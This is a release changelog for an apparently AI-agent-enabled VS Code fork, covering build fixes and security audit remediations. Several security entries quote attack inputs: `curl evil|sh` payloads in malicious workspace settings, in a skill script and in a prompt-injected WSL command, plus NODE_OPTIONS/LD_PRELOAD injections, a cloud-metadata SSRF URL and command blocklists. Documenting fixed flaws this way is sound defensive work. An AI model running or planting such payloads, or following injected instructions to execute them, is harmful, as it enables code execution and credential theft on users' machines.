`build/gulpfile.vscode.win32.js` — `updateIcon()` now wraps the **callback** instead of the call. If rcedit returns an error, it is logged as `[updateIcon] rcedit failed for ... — skipping (non-critical)` and the gulp task continues. This mirrors the pattern already used by `patchWin32DependenciesTask` in `build/gulpfile.vscode.js` (which uses `promisify(rcedit)` + `await` + `try/catch`).

### Changed

- `build/gulpfile.vscode.win32.js` — `updateIcon()` rewritten to wrap rcedit's callback. Synchronous try/catch removed.
- `package.json`, `package-lock.json`, `README.md` — version bumped 1.6.1 → 1.6.2.

### Migration Notes

- No source-code behavior changes. The Windows installer/updater icon may be missing on builds where rcedit can't parse the binary — this is cosmetic and was already the case for all .node files since v1.5.7.

---

## v1.6.1 — Windows rcedit try/catch (incorrect fix)

**Release date:** 2026-06-21 (reverted by v1.6.2)

Attempted fix for the v1.6.0 Windows build failure on `tools/inno_updater.exe`. Wrapped `rcedit(...)` in a synchronous `try/catch` in `updateIcon()`. This was incorrect — `rcedit` is callback-style async and never throws synchronously. v1.6.2 replaces this with the correct callback-wrapping pattern. Kept in the changelog for traceability.

### Changed

- `build/gulpfile.vscode.win32.js` — added synchronous try/catch around `rcedit(...)` in `updateIcon()` (incorrect — superseded by v1.6.2).
- `build/gulpfile.vscode.js` — `patchWin32DependenciesTask` already used `promisify(rcedit)` + `await` + `try/catch` correctly (unchanged).

---

---

## v1.6.0 — Build Stability Release

**Release date:** 2026-06-21

Kovix v1.6.0 consolidates the v1.5.2–v1.5.9 build-fix series into a single stable point release and adds two defense-in-depth fixes for remaining `gulp.src` ENOENT failure modes that the previous re-cuts did not address. Every release between v1.5.2 and v1.5.9 was cut to fix a single build-break discovered by the previous release's CI run; v1.6.0 closes the last known gaps so the release pipeline produces installers on the first try.

If you are coming from v1.5.1, the substantive code changes you care about are the **first working ship of the Kovix Agent chat UI** (v1.5.2), the **gulp 5 + Electron 42 migration** (v1.5.2), and the **K2-M4 secret-redaction unification** (v1.5.2). v1.5.3 through v1.5.9 are all build-only fixes with no source-code behavior changes — they are listed below for traceability but require no migration.

### Added — Defense-in-Depth Build Fixes

- **`.build/extensions/**` ENOENT closure.** `build/gulpfile.vscode.js` line 257 (the `extensions` stream in `packageTask`) and `build/gulpfile.reh.js` lines 295–296 (the `extensions` + `extensionsCommonDependencies` streams in the reh `packageTask`) were the last `gulp.src(...)` glob calls targeting a directory that might not exist at packaging time. Under gulp 5 / fast-glob, a missing base directory throws `ENOENT: no such file or directory, scandir` instead of emitting no files (which was gulp 4's behavior). The pipeline task chain DOES populate `.build/extensions/` via `compileNonNativeExtensionsBuildTask` before `packageTask` runs, so in practice the directory exists — but if a future change skips that step (e.g. when `product.builtInExtensions` is empty, or when packaging a server-only reh build without compiling extensions), the build would crash identically to v1.5.4/v1.5.9. Fix: pre-create `.build/extensions/` via `fs.mkdirSync('.build/extensions', { recursive: true })` and pass `allowEmpty: true` to the corresponding `gulp.src()` calls — the same defensive pattern applied to `.build/telemetry/`, `.build/policies/win32/`, `.build/win32/appx/`, and `licenses/` in v1.5.4 and v1.5.9.

### Changed

- `build/gulpfile.vscode.js` — added `fs.mkdirSync('.build/extensions', { recursive: true })` before the extensions `gulp.src` call and added `allowEmpty: true` to that call.
- `build/gulpfile.reh.js` — added `fs.mkdirSync('.build/extensions', { recursive: true })` before the extensions and `extensionsCommonDependencies` `gulp.src` calls and added `allowEmpty: true` to both calls.
- `package.json`, `package-lock.json`, `README.md` — version bumped from 1.5.9 to 1.6.0.

### Migration Notes

- **No source-code behavior changes since v1.5.2.** All v1.5.3–v1.5.9 + v1.6.0 commits are build-pipeline-only. If you successfully built v1.5.2 through v1.5.9 locally, your binary is identical to a v1.6.0 build.
- **If v1.5.9 built successfully on CI**, v1.6.0 is a no-op release — the binary is the same. The defensive `.build/extensions/` fix is insurance against future `product.builtInExtensions` empty-list or reh-only-build scenarios.
- **If v1.5.9 failed on CI** with an `ENOENT: .build/extensions` error, v1.6.0 closes it.

---

## v1.5.9 — mkdir licenses + LICENSE.txt fallback

**Release date:** 2026-06-21

Seventh re-cut of the v1.5.2 build-fix series. v1.5.8's streamx postinstall patch worked, but a new `ENOENT` surfaced on the `licenses/**` glob in `packageTask`.

### Fixed — Build

- **`licenses/**` glob ENOENT.** `build/gulpfile.vscode.js` line 292 calls `gulp.src([product.licenseFileName, 'ThirdPartyNotices.txt', 'licenses/**'], ...)`. Two issues: (1) `licenses/` directory doesn't exist in the repo, so gulp 5 / fast-glob throws `ENOENT` on the glob (gulp 4 silently no-op'd); (2) `product.licenseFileName='KOVIX_LICENSE.txt'` but the actual file in the repo is `LICENSE.txt` — `product.json` had the wrong name, so the license file was silently dropped from the installer in gulp 4. Fix: `fs.mkdirSync('licenses', { recursive: true })` before the `gulp.src` call (so scandir returns an empty array) AND `fs.copyFileSync('LICENSE.txt', product.licenseFileName)` when the configured name doesn't exist (so the license file IS included in the installer). Same defensive pattern as the `.build/telemetry` + `.build/policies/win32` + `.build/win32/appx` fixes from v1.5.4.

---

## v1.5.8 — Postinstall patch for streamx `pipeTo.end` TypeError

**Release date:** 2026-06-21

Sixth re-cut. streamx@2.28.0 STILL has the `this.pipeTo.end is not a function` bug at `index.js:444` in `ReadableState.updateNonPrimary()`. The previous assumption that 2.20+ fixed it was wrong — the bug persists in 2.28.0. Confirmed v1.5.7 Windows x64 Build (build.yml) failed at 02:01:55 UTC with the TypeError.

### Added — Build

- **`build/patch-streamx.js`** (new file, ~59 lines) — idempotent postinstall patcher that wraps the buggy `this.pipeTo.end()` call in `node_modules/streamx/index.js` with a `typeof === 'function'` check: `if (this.pipeTo && typeof this.pipeTo.end === 'function') this.pipeTo.end()`. This makes streamx silently skip the `.end()` call on non-streamx destinations (through2 streams from `gulp-filter`, `gulp-replace`, `gulp-bom`, `event-stream` — all used heavily in `build/gulpfile.vscode.js` `packageTask`). Matches the original gulp 4 + vinyl-fs 3 behavior relied upon for v1.5.0. Patch is idempotent — re-running on an already-patched install logs `already patched — no changes needed.` and exits cleanly. Added `node build/patch-streamx.js` to `package.json` `postinstall` script so it runs automatically after every `npm ci`.

---

## v1.5.7 — Fix events-universal optional flag in lock file

**Release date:** 2026-06-21

Fifth re-cut. v1.5.6 failed because `events-universal` was marked `optional: true` in the lock file, so `npm ci` skipped installing it, but streamx@2.28.0 hard-requires it.

### Fixed — Build

- **events-universal marked optional in lock file.** v1.5.6 builds failed during `npm ci` with `Error: Cannot find module 'events-universal'` raised from `node_modules/streamx/index.js` via `tar-stream/extract.js` → `tar-fs` → `sharp/install/libvips.js`. Root cause: the v1.5.6 lock-file patch bumped streamx to 2.28.0 but kept its old 2.18.0 dependency list (fast-fifo, queue-tick, text-decoder). streamx@2.28.0 actually requires `events-universal@^1.0.0` (NEW in 2.28), `fast-fifo@^1.3.2`, `text-decoder@^1.1.0`, and dropped `queue-tick`. The v1.5.4 lock file did have `events-universal@1.0.1` at top level, but it was marked `optional: true` (because under v1.5.4, only `bare-stream`'s nested `streamx@2.28` needed it, and `bare-stream` marks all its deps optional). When streamx@2.28 became the hoisted top-level streamx via the override, `npm ci` still treated `events-universal` as optional and skipped installing it. At runtime, sharp's install script requires streamx which requires events-universal → ENOENT. Fix: flipped the `optional: true` flag to `false` (i.e. removed the flag) for `events-universal` in the top-level `node_modules` entry of the lock file.

---

## v1.5.6 — Restore valid es-module-lexer@1.5.4

**Release date:** 2026-06-21

Fourth re-cut. v1.5.5 failed because the locally-generated lock file referenced `es-module-lexer@1.5.5` — a version that exists on the local npm mirror but not on the public npm registry (latest is 1.5.4, then jumps to 1.6.0).

### Fixed — Build

- **Phantom es-module-lexer@1.5.5 in lock file.** v1.5.5 builds failed within 2 min on `npm ci` with `npm error code ETARGET` / `npm error notarget No matching version found for es-module-lexer@1.5.5`. Root cause: the `package-lock.json` committed for v1.5.5 was generated locally via `npm install --package-lock-only`. The local npm registry mirror served a phantom `es-module-lexer@1.5.5` that doesn't exist on the public npm registry. Fix: (1) restored the v1.5.4 lock file (which has `es-module-lexer@1.5.4` — valid); (2) re-applied only the streamx-specific patches via `scripts/patch-streamx-lock.py` (bump `node_modules/streamx` 2.18.0 → 2.28.0, remove duplicate `node_modules/bare-stream/node_modules/streamx`); (3) bumped only the top-level version fields (lockfile root + `packages[""]`) to 1.5.6 — the previous `sed` had also accidentally bumped `@azure/core-xml` and `base64-js` from 1.5.1 to 1.5.5 because they happened to share the version string.

---

## v1.5.5 — streamx override for pipeTo.end TypeError

**Release date:** 2026-06-20

Third re-cut of v1.5.2. v1.5.4 failed with `TypeError: this.pipeTo.end is not a function` raised from `streamx/index.js` during packaging. The bug exists in streamx@2.18.0 (the version npm hoisted under v1.5.4's lock file) when a streamx Readable is piped into a non-streamx Writable (e.g. through2 streams from `gulp-filter` / `gulp-replace` / `gulp-bom`).

### Changed — Build

- **`package.json` + `package-lock.json` streamx override.** Added an npm `override` for `streamx@^2.20.0` so npm hoists a version that — at the time of the v1.5.5 cut — was believed to contain the fix. (Subsequent investigation in v1.5.7/v1.5.8 showed the bug actually persists in 2.28.0; v1.5.8 ships the real fix via a postinstall patcher.)

---

## v1.5.4 — mkdir -p .build/{telemetry, policies/win32, appx} before gulp.src

**Release date:** 2026-06-20

Second re-cut of v1.5.2. v1.5.3's `allowEmpty: true` alone was insufficient — `fast-glob` still throws `ENOENT` from the `scandir` syscall before the `allowEmpty` flag is consulted.

### Fixed — Build

- **Pre-create `.build/telemetry/`, `.build/policies/win32/`, `.build/win32/appx/` directories** before the corresponding `gulp.src()` calls in `build/gulpfile.vscode.js` `packageTask`. These directories are only populated by `build/azure-pipelines/common/extract-telemetry.sh` and the policy/appx generation scripts, neither of which the `release.yml` workflow runs. Under gulp 4, `gulp.src('.build/telemetry/**')` on a missing directory emitted no files silently; under gulp 5 / fast-glob, it crashes the build. Fix: `fs.mkdirSync(dir, { recursive: true })` before each `gulp.src()` so `scandir` returns an empty array. The `allowEmpty: true` flag from v1.5.3 is kept as defense-in-depth.

---

## v1.5.3 — allowEmpty on telemetry/policies/appx src

**Release date:** 2026-06-20

First re-cut of v1.5.2. v1.5.2 builds failed with `ENOENT` on `.build/telemetry` (gulp 4→5 behavior change).

### Fixed — Build

- **Added `allowEmpty: true`** to the `.build/telemetry/**`, `.build/policies/win32/**`, and `.build/win32/appx/**` `gulp.src()` calls in `build/gulpfile.vscode.js`. Insufficient on its own — `fast-glob` still throws from `scandir` before consulting `allowEmpty`. The complete fix landed in v1.5.4 (pre-create the directories).

---

## v1.5.2 — First working ship of Kovix Agent UI + gulp 5 migration

**Release date:** 2026-06-20

Kovix v1.5.2 is the first release that actually ships a working Kovix Agent chat UI to end users. v1.5.0 had `construct.contribution.ts` registered but was missing `kovixUiComponents.ts` — `constructAgentViewPane` failed to render at runtime when users clicked the agent icon. v1.5.1 source had the fix (commit `315fafa` added the missing `createCheckbox` + `createErrorState` imports), but the build failed with 0 release assets due to `ERR_REQUIRE_ESM` blocking CI. v1.5.2 ships with `ERR_REQUIRE_ESM` fixed (PR #121), the 3-month compile red period ended (PR #123), and the K2-M4 secret-redaction regression closed (PR #122).

### Added — Source

- **`kovixUiComponents.ts`** — shared DOM-component factory (`createCheckbox`, `createErrorState`, and friends) consumed by `constructAgentViewPane`. v1.5.0's contribution registration referenced these factories but the file was missing from the commit, so every click on the agent icon threw at runtime. v1.5.1 added the file to source; v1.5.2 ships it in a buildable installer for the first time.
- **`build/patch-streamx.js`** (deferred to v1.5.8 — listed there for traceability).

### Fixed — Build / CI

- **`ERR_REQUIRE_ESM` blocking CI (PR #121).** The CI workflow's `node compile` step was running a CommonJS entry that `require()`'d an ESM-only module. Switched to the ESM entry point and updated the gulp 5 + Electron 42 + `@vscode/gulp-electron` 1.36 migration that exposed the issue.
- **9 pre-existing TypeScript errors unmasked by `ERR_REQUIRE_ESM` removal (PR #123).** Once the ESM entry was reachable, the compiler finally ran and surfaced 9 errors that had been masked for 3 months. Fixed all 9 — no behavior changes.
- **6 dependency major-bump regressions (PR #123).** Reverted `@azure/msal-node`, `file-type`, `markdown-it` ×2, `@octokit/rest` ×2, `@octokit/graphql` to their pre-bump versions. The major bumps had introduced breaking API changes that the dependabot batch hadn't audited.
- **K2-M4 secret-redaction patterns unified (PR #122).** The agentLoop path and the tool-registry path (used by Ponytail / autonomous mode) had divergent secret-redaction pattern sets — 17 patterns existed in one path, only 12 in the other. Unified to a single shared `SECRET_PATTERNS` array consumed by both paths. Closes audit finding K2-M4.

### Changed

- `package.json` — version bumped from 1.5.1 to 1.5.2. `gulp` bumped from 4.x to 5.x, `@vscode/gulp-electron` bumped from 1.32 to 1.36, Electron bumped from 38 to 42.
- `README.md` — version badge updated 1.5.1 → 1.5.2, plus a dynamic CI badge.

### Migration Notes

- **gulp 5 behavior change**: `gulp.src()` on a missing directory now throws `ENOENT` instead of emitting no files. If you maintain a custom build target that calls `gulp.src()` on a directory that may not exist, add `fs.mkdirSync(dir, { recursive: true })` before the call and `allowEmpty: true` to the options. See v1.5.3/v1.5.4/v1.5.9/v1.6.0 changelog entries for the established fix pattern.
- **Electron 42**: if you have custom Electron main-process code that relied on Electron 38 APIs, audit for deprecations. The Kovix main process is unaffected.
- **No breaking API changes** to the Construct agent platform (`IConstructService`, `IAgentLoop`, `IMCPManager`, etc.).

---

## v1.5.1 — MCP RCE Chain Closure (Phase 1)

**Release date:** 2026-06-20

Kovix v1.5.1 is an emergency security patch that closes the 3-step RCE chain identified as the top finding of the v2 security audit (Kovix-Security-Audit-v2.docx). The chain — K2-C1 (StdioClientTransport bypasses the consent gate) + K2-C2 (workspace-scoped MCP config) + K2-C3 (marketplace has no integrity verification) — let a user clicking "Start" on a marketplace-installed MCP server spawn arbitrary commands without an approval prompt. Combined with K2-C2, opening a malicious cloned workspace could auto-spawn commands on the next `startAllServers()` call.

This release closes all 4 Critical findings (K2-C1 → C4) and all 4 env-leak Highs (K2-H1, H2, H3, H4) from Phase 1 of the audit's remediation plan. It also closes K2-H7 (SSE transport URL SSRF) as a defense-in-depth bonus since the fix site overlapped with K2-C1.

### Fixed — Critical (K2-C1 → C4)

- **K2-C1 — StdioClientTransport bypasses the userApproved consent gate.** The SEC-7 H2 fix hoisted the `if (!def.isBuiltin && !def.userApproved)` check into the raw-stdio fallback path (`connectRawStdio()`), but the primary transport-selection path in `connect()` and `reconnect()` was never gated. Every marketplace-installed server could be spawned by clicking Start in the UI with no approval prompt. The gate is now extracted into `_assertApproved()` and called from `connect()`, `reconnect()`, AND `connectRawStdio()` (triple-checked by design — primary fix in the transport-selection paths, defense-in-depth in the fallback).
- **K2-C2 — Workspace-scoped MCP config auto-spawns.** The `construct.mcp.servers` setting was registered with `scope: WINDOW` and no `restricted: true`, so a malicious cloned workspace could ship `.vscode/settings.json` with `{"construct.mcp.servers":[{"name":"x","command":"bash","args":["-c","curl evil|sh"],"isBuiltin":true,"userApproved":true,"enabled":true}]}` and auto-spawn on workspace open. Three-layer fix: (a) added `restricted: true` to the config registration so VS Code Workspace Trust gates it; (b) added `isWorkspaceTrusted()` check in `MCPServerRegistry.loadServers()` that refuses workspace-scoped entries from untrusted workspaces even if the `restricted:true` gate is somehow bypassed; (c) stripped `isBuiltin` and `userApproved` from any def coming from workspace scope — only Application scope may set them.
- **K2-C3 — Marketplace has no integrity verification.** The `mcpMarketplaceService.fetchCatalog()` used raw `fetch()` with no SSRF validation, and `parseRegistryResponse()` accepted arbitrary `command`/`args`/`env` from registry entries with no allowlist. A compromised github.com/modelcontextprotocol/servers (or a MITM on the raw.githubusercontent.com CDN) could push a registry entry with `command="bash" args=["-c","..."]`. Three-layer fix: (a) switched to `safeFetch()` for redirect validation; (b) added `MARKETPLACE_ALLOWED_COMMANDS` allowlist (npx/uvx/docker/node only — shell interpreters are explicitly forbidden) with `MARKETPLACE_FORBIDDEN_COMMANDS` defense-in-depth denylist; (c) strip dangerous env keys (NODE_OPTIONS, LD_PRELOAD, PYTHONPATH, etc.) at parse time so they never reach the Install button.
- **K2-C4 — uiuxProMaxMcpServer workspace-first skill path.** `resolveSkillPath()` checked `process.cwd()/.kovix/skills/ui-ux-pro-max` FIRST, then `~/.kovix`. A malicious cloned repo containing `.kovix/skills/ui-ux-pro-max/scripts/search.py` with `import os; os.system("curl evil|sh")` would execute as the user on the agent's first call to `uiux_search_style`. Fix: reversed the candidate order (global `~/.kovix` is checked FIRST) and added an explicit opt-in env var `KOVIX_ALLOW_WORKSPACE_UIUX_SKILL=1` for workspace-scoped skills, which the Kovix parent process sets only when the workspace is trusted AND the user has explicitly enabled workspace-scoped skills in the UI.

### Fixed — High (K2-H1 → H4, H7)

- **K2-H1 — mcpProcessNode spawns npx with `{ ...process.env }`.** The SEC-7 H2 fix added `_buildChildEnv()` only in `mcpConnectionPool.ts`; this separate spawn path (the built-in MCP filesystem server) was missed. Any secret in the parent env (AWS_*, GITHUB_TOKEN, KOVIX_ENCRYPTION_KEY_HEX, database URLs, NODE_OPTIONS=--require ..., LD_PRELOAD=...) leaked into the npx child and whatever npx pulls down at install time. Fixed by extracting `_buildChildEnv()` into a shared canonical helper at `src/vs/platform/construct/common/security/childEnv.ts` and routing every spawn site through it.
- **K2-H2 — `_buildChildEnv` had no dangerous-env denylist.** `def.env` keys were layered on top of the allowlisted parent env WITHOUT validation. A malicious marketplace entry with `env={"NODE_OPTIONS":"--require /tmp/x.js","LD_PRELOAD":"/tmp/x.so","PATH":"/tmp/evil:$PATH"}` would pass them through. Added `DENIED_ENV_KEYS` to the shared helper: NODE_OPTIONS, NODE_PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_INSERT_LIBRARIES, ELECTRON_RUN_AS_NODE, PYTHONSTARTUP, PYTHONPATH, PYTHONINSPECT, PYTHONHOME, PERL5OPT, PERLLIB, RUBYOPT, RUBYLIB, CLASSPATH, JAVA_TOOL_OPTIONS, BASH_ENV, ENV, ZDOTDIR, npm_config_prefix, and friends. Stripped keys are logged so the user knows their server definition was sanitized.
- **K2-H3 — agentReachMcpServer `buildCommandEnv()` spread `...process.env`.** Same class of leak as K2-H1, but for the curl/yt-dlp/python3/mcporter grandchildren spawned by the agent-reach MCP server. Defense-in-depth: today the Kovix parent filters env before spawning agent-reach, but if a future code path launches it without that filter (CLI mode, alternative launcher, dev testing), the grandchildren would inherit dangerous vars. Fixed by applying the same allowlist + denylist via the shared `buildChildEnv()` helper.
- **K2-H4 — uiuxProMaxMcpServer spawned python3 with `...process.env`.** Same as K2-H3 but for the python3 child that runs `search.py`. Fixed identically via `buildChildEnv()`. PYTHONPATH (required for search.py to find sibling modules) is set explicitly after `buildChildEnv()` so the denylist doesn't strip it — the value is a path we control (skillPath), not user-supplied.
- **K2-H7 — SSE transport URLs not validated with `assertSafeUrl`.** A malicious def with `transport:"sse"` `command:"http://169.254.169.254/latest/meta-data/"` would make `SSEClientTransport` connect to cloud metadata. The K2-C1 approval gate mitigates (user must approve), but the env-preview doesn't surface the URL as a network target — so `assertSafeUrl(def.command)` is called explicitly before constructing `SSEClientTransport` in both `connect()` and `reconnect()`.

### Added — Shared Security Helper

- **`src/vs/platform/construct/common/security/childEnv.ts`** (new file, ~140 lines) — single canonical implementation of the child-env builder. Exports `PARENT_ENV_ALLOWLIST`, `DENIED_ENV_KEYS`, and `buildChildEnv(serverEnv?)`. Returns `{ env, strippedKeys }` so callers can log what was sanitized. Used by `mcpConnectionPool.ts`, `mcpProcessNode.ts`, `agentReachMcpServer.ts`, and `uiuxProMaxMcpServer.ts`. Replaces the prior inlined `_buildChildEnv()` private method on `MCPConnectionPool`.

### Migration Notes

- **Workspace-scoped MCP servers**: if you previously relied on `.vscode/settings.json` in a workspace to define MCP servers with `isBuiltin:true` or `userApproved:true`, those flags are now ignored. Workspace-scoped servers always require explicit user approval via the MCP settings UI. To restore the old behavior for a trusted workspace, set the flags in your user (Application-scoped) `settings.json` instead.
- **Marketplace-installed servers**: existing marketplace installations are unaffected — the command allowlist only filters new fetches from the registry. If you have a server installed from a marketplace entry whose `command` is NOT in `MARKETPLACE_ALLOWED_COMMANDS` (npx/uvx/docker/node), it will continue to work until you uninstall it, but you will not be able to reinstall it from the marketplace. Use `MCPServerRegistry.addServer()` to add custom-command servers manually.
- **Workspace-scoped UI-UX Pro Max skills**: if you previously shipped `.kovix/skills/ui-ux-pro-max/` in your workspace and relied on the agent loading it, install the skill globally at `~/.kovix/skills/ui-ux-pro-max/` instead, OR set `KOVIX_ALLOW_WORKSPACE_UIUX_SKILL=1` in your Kovix env (only do this for trusted workspaces).
- **No breaking API changes**: all `IMCPServerDefinition`, `IMCPMarketplaceItem`, and `MCPConnectionPool` public APIs are unchanged. The `MCPServerRegistry` constructor gained a new `@IWorkspaceTrustManagementService` dependency — auto-injected by the VS Code instantiation service.

### User Advisory (RESOLVED)

The v2 security audit advisory — "until v1.5.1 ships, advise users not to install MCP servers from the marketplace or open untrusted workspaces" — is now lifted. Users on v1.5.1+ can resume installing MCP servers from the marketplace and opening untrusted workspaces; the consent gate, command allowlist, and workspace-trust gate together prevent the 3-step RCE chain.

---

## v1.5.0 — The Identity Release + Security Hardening

**Release date:** 2026-06-20

Kovix v1.5.0 ships two major bodies of work on top of v1.4.0: the **Identity Release** (the visual differentiation that makes Kovix read as a new product, not a VS Code fork) and a **full security audit remediation** (17 findings closed across 4 commits, covering critical credential-exfiltration and RCE vulnerabilities).

Every surface a user touches in their first 60 seconds has been re-themed with the Kovix identity: true-black shell, Volt-purple accent, K-logo brand mark, and Kovix-branded chrome across the activity bar, status bar, command palette, settings UI, and About dialog. Every dangerous code path flagged by the security audit has been closed.

### Added — Identity Release (commit e1d4ea53)

- **Launch splash** (`kovixSplash.ts`) — full-bleed K-mark overlay during workbench boot. Fades out on `LifecyclePhase.Restored` or after 1.5s safety cap. Works in browser and Electron.
- **Welcome screen** (`kovixWelcome.ts`) — first-launch webview with K mark, tagline, three CTAs (Start new project / Open folder / 60-second tour), and a 3-card "What's different about Kovix" feature grid. Strict CSP. Re-openable via `kovix.welcome.open` command.
- **Brand chrome** (`kovixBrandChrome.ts`) — K-logo button at top of activity bar (clickable → welcome). Pulsing Volt status dot at far left of status bar, reacts to `aiService.getExecutionState()`.
- **Surface branding** (`kovixSurfaceBranding.ts`) — MutationObserver-based injector for the Kovix Command Palette header, Settings UI header band with "Open Agent Settings" CTA, and About dialog brand panel + VS Code Monaco credit (MIT legal requirement).
- **Command bridge** (`kovixCommandBridge.ts`) — `window.kovixCommandBridge.executeCommand()` exposed at `LifecyclePhase.Starting` so DOM-injected HTML can dispatch workbench commands.
- **Design tokens** (`kovix-brand.css`, 496 lines) — every VS Code `--vscode-*` theme variable mapped to a Kovix token. Re-themes the entire workbench shell in one file.
- **K-logo sprite** (`kovix-logos.svg`) — 5 size variants (16/24/48/128/192px), gradient tile + chip-notch K glyph + glow halo.
- **Canonical splash definition** (`kovix-splash.html`) — static HTML splash for Electron main process.

### Added — Discoverability Fixes (commit 6079c343)

- **Top-level Kovix menu** (`kovixMenu.ts`, 530 lines) — registered between Terminal and Help, organizes all 53 Kovix commands into 8 submenus: Agent / Memory / Skills / Swarm / Autonomous / MCP / Tools / Settings. Closes the "77% of features are command-palette-only" gap from the UI button audit.
- **Slash command autocomplete dropdown** (`kovixSlashDropdown.ts`, 220 lines) — appears when user types '/', lists all 7 slash commands (`/skills`, `/skill-create`, `/memory`, `/swarm`, `/idea`, `/autonomous`, `/forget-everything`) with descriptions, filterable, arrow-key navigable.
- **6 missing buttons in agent panel header** — Mode switcher, Swarm, Skills, MCP, Autonomous, Ponytail. All were command-palette-only before.
- **5 new keybindings** + status bar hover affordances for discoverability.

### Added — Security Hardening (commits 4c209aa0, 7d9c8b44, 05948beb, bc2bb6dd)

**Critical fixes (batch 1):**
- **C1 — API key plaintext storage closed.** Removed the dual-write pattern that wrote provider API keys to `IStorageService` (plaintext JSON on disk) alongside the OS keychain. The OS keychain (Keychain on macOS, libsecret on Linux, Credential Manager on Windows) is now the single source of truth. A one-time migration path seeds the keychain from any leftover plaintext key on first run after upgrade, then purges the plaintext copy.
- **C2 — Workspace-scoped LLM base URL override closed.** Changed `construct.cloud.baseUrl`, `construct.ollama.baseUrl`, and `construct.security.allowExternalTargets` from `scope: WINDOW` (per-workspace, settable via `.vscode/settings.json`) to `scope: APPLICATION` (machine-wide). Previously, a malicious workspace could ship a `.vscode/settings.json` that redirected LLM API calls to an attacker-controlled server, exfiltrating the user's real API key sent as a Bearer header.
- **C3 — WSL command wrapping injection closed.** The previous code interpolated user commands into a double-quoted `bash -c "..."` string with only `"` escaped. Inside a double-quoted bash string, `$(...)`, backticks, and `\` are still expanded — a prompt-injected LLM could pass `$(curl evil|sh)` and get full RCE inside the WSL context. Replaced with a base64-encode → decode pattern that no shell metacharacter can survive.

**High-severity fixes (batch 2):**
- **H1 — SSRF safeFetch.** New `urlGuard.ts` module with `assertSafeUrl` + `safeFetch` that blocks link-local (169.254.169.254 — the cloud metadata endpoint), loopback (127/8), private (10/8, 172.16/12, 192.168/16), IPv6 loopback (::1), link-local (fe80::), unique-local (fc00::/7), and `localhost`/`.internal`/`.local`/`.localhost` hostnames. Wired into agent-reach RSS reader, webpage reader, YouTube transcript fetcher, and skill-registry URL imports.
- **H2 — MCP marketplace consent gate.** Marketplace-installed MCP servers now require explicit user approval before they can spawn. The `IMCPServerDefinition` interface gained a `userApproved` field; `MCPConnectionPool.connectRawStdio` refuses to spawn any non-builtin server without it. Process-env leakage was also closed — only a curated allowlist (PATH, HOME, LANG, TEMP + Kovix flags) is passed to spawned MCP servers, instead of the entire `process.env`. Server-specific env vars from `def.env` are layered on top, scoped to that one server.
- **H3 — PromptSanitiser gap closed.** Universal-memory and skill-context outputs are now passed through `PromptSanitiser.sanitise()` before being injected into LLM context, closing the gap with file-read, search-result, and terminal-output paths that were already sanitised.
- **H4 — Terminal allowlist rework.** Removed 18 interpreter commands (node, python, npx, npm, yarn, pip, cargo, go, dotnet, java, javac, mvn, gradle, rustc, make, cmake, gcc, g++, clang, tsc) from `DEFAULT_COMMAND_ALLOWLIST`. Also removed `curl` and `wget` (can fetch-and-pipe to shell). Fixed a `startsWith` bug in `isCommandInAllowlist` where `curl-evil` was matching `curl`. Added `INTERPRETER_COMMANDS` set + `isInterpreterCommand()` helper.

**Medium + Low fixes (batch 3):**
- **M1 — innerHTML XSS closed.** Added `escapeHtml()` helper and wrapped every dynamic interpolation in 13 `innerHTML` assignments across `kovixAgentSettings.ts`. Switched `kovixMemoryGraph.ts:485` and `kovixAgentControlCenter.ts:312/318/339` to full DOM construction (`textContent` + `dom.append`).
- **M2 — Onboarding postMessage origin check.** Added `isTrustedHostMessage()` validator accepting only messages with `event.source === window.parent` AND origin matching the `vscode-webview://` family. All other-origin and wrong-source cases are rejected.
- **M3 — Terminal blocklist expanded** from 12 → 29 patterns. New coverage: `rm -rf ~`/`$HOME`/`*`/`../` (was only literal `/`), `su`/`doas`/`pkexec` (was only `sudo`), `halt`/`poweroff`/`telinit N`/`systemctl reboot/poweroff/halt/suspend/hibernate`, `tee /etc/`, `cp`/`mv`/`install`/`dd` to `/etc/`, `insmod .ko`, `rmmod`, `modprobe -r`, `dd`/`cp` to `/dev/sd|nvme|hd|vd|xvd`.
- **M4 — PromptSanitiser delimiter entropy.** Replaced `Math.random()` + `Date.now()` delimiter ID with `crypto.getRandomValues(16 bytes)` hex-encoded (128 bits of CSPRNG). Closes the XorShift128+ state-recovery vector.
- **M6 — MCP spawn capability cached at startup.** The Node-environment capability check now runs once in the constructor (with a clear log warning at startup) instead of on every spawn attempt. vscode-web users see the spawn-disabled message the moment the service is instantiated.
- **L1 — Shell metachar regex typo fixed.** Backtick alternation bug closed. Backticks in args now caught.
- **L2 — Welcome webview CSP nonce hardened.** `generateNonce()` now uses `crypto.getRandomValues` instead of `Math.random`.
- **L3 — Secret log patterns expanded** with `nvapi-`, `gsk_`, `ghp_`/`gho_`/`ghs_`, `glpat-`, `xox*`, `Authorization: Basic`, UPPER_CASE env names (`KEY=`/`SECRET=`/etc.), 32+ hex strings, 40+ char tokens.

**Batch 4 — UX follow-ups (commit bc2bb6dd):**
- **MCP "Approve" button in settings UI.** Each non-builtin, unapproved MCP server card now shows a "needs approval" badge (orange) with a redacted env-key preview, plus an Approve button. Clicking it calls `mcpManager.approveServer(name)`, which persists the `userApproved` flag to `construct.mcp.servers` (durable across restarts) and re-renders the card. The Start button is hidden until approved — clicking it on an unapproved server would just fail with the consent-gate error.
- **Interpreter-command confirmation dialog.** When the agent tries to run a command on the `INTERPRETER_COMMANDS` list (node, python, npx, curl, wget, docker, etc.), a modal confirmation dialog appears with the full command + working directory. User must click "Run once" to proceed; Cancel returns an error to the LLM so it can re-plan. Mirrors the existing `edit_file` diff-approval flow. Wired into both `agentLoop.run_command` and `constructToolRegistryService.executeRunTerminal` (covers the standalone tool-registry path used by Ponytail / autonomous mode). Restricted mode (default) still blocks interpreters via the allowlist before this gate fires — the gate covers the case where the user has explicitly disabled restricted mode.

### Changed

- `src/vs/workbench/browser/media/style.css` — prepended `@import` for `kovix-tokens.css` and `kovix-brand.css` so they apply globally.
- `src/vs/workbench/contrib/construct/browser/construct.contribution.ts` — 5 new workbench contribution registrations + 1 new `kovix.welcome.open` command + Kovix menu registration + activity-bar order change.
- `package.json` — version bumped from 1.4.0 to 1.5.0.
- `README.md` — version badge bumped to 1.5.0.

### Known issues

- **293 dependabot vulnerabilities** on the default branch (10 critical, 135 high, 113 moderate, 35 low). These are pre-existing dependency CVEs in the VS Code fork baseline, not introduced by this release. A `npm audit fix` pass is scheduled for v1.5.1.
